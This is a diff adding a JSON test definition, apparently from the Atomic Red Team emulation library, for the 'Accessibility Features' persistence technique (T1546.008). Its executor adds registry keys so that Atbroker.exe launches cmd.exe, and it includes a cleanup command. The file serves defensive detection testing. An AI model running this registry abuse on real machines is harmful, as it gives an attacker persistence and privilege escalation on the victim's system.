@@ -1,0 +1,25 @@
+{
+    "name": "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key",
+    "description": "Executes code specified in the registry for a new AT (Assistive Technologies). ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe\natbroker /start malware_test\n",
+        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1546.008",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Accessibility Features",
+    "source": "ART",
+    "uuid": "444ff124-4c83-4e28-8df6-6efd3ece6bd4",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
